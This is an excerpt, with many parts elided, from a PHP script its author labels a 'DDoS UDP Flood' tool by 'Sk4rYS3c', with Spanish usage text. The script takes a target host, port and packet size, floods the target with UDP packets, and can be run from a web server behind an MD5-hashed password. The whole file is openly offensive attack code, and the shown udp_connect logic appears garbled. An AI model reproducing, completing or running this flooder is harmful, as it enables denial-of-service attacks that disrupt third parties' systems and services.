...
// MD5 Password to be used when the script is executed from the webserver, default is "uncensored"
define('DDOS_PASSWORD',				'd05cfc46d7a155982acfcb307bac002b' );
...
class DDoS {
	...
	public function signature() {
		if(DDOS_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
			$this->println('DDoS UDP Flood | By Sk4rYS3c');
	...
	public function usage() {
		...
		$this->println("help	Muestra un resumen de ayuda");
		$this->println("host	REQUERIDO especificar IP o HOSTNAME");
		$this->println("pass	REQUERIDO solo si se usa desde un servidor web");
		...
		$this->println();
		$this->println("Creado por Sk4rYS3c");
		$this->println();
	}
	...
	private function attack(){
		...
		$this->log('DDos UDP flood ha iniciado');
		...
		$this->log("DDoS UDP flood completado");
		...
		$this->set_output('UDP flood completado', DDOS_OUTPUT_STATUS_SUCCESS,$data);
	...
	private function udp_connect($h,$p,$out){
		...
		if(!$fp) {
			...
			if(!@fwrite($fp, $out)) {
				$this->log("Error al enviar paquetes",DDOS_LOG_ERROR);
			}
			else {
				$this->log("Paquetes enviados satisfactoriamente",DDOS_LOG_DEBUG);
			}
			@fclose($fp);
			$ret = true;
	...
	private function validate_params() {
		...
		if(!$this->is_cli() && md5($this->get_param('pass')) !== DDOS_PASSWORD) {
			$this->set_output("Error contraseña", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		elseif(!$this->is_cli()) {
			$this->log('Contraseña aceptada');
		}
		
		if(!$this->is_valid_target($this->get_param('host'))) {
			$this->set_output("IP o HOST Invalido", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			$this->log("Ataque hacia " . $this->get_param('host'));
		}
		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
			$this->log("Error de Puerto", DDOS_LOG_WARNING);
			$this->log("Puerto utilizado ",DDOS_LOG_NOTICE);
			$this->set_param('port', 0);
		}
		else {
			$this->log("Puerto utilizado ".$this->get_param('port'));
		}
		...
		if(is_numeric($this->get_param('bytes')) && 0 < $this->get_param('bytes')) {
			...
			$this->log("Tamaño de paquete ". $this->format_bytes($this->get_param('bytes')));
		}
		else {
			$this->log("Tamaño de paquete ".$this->format_bytes(DDOS_DEFAULT_PACKET_SIZE),DDOS_LOG_NOTICE);
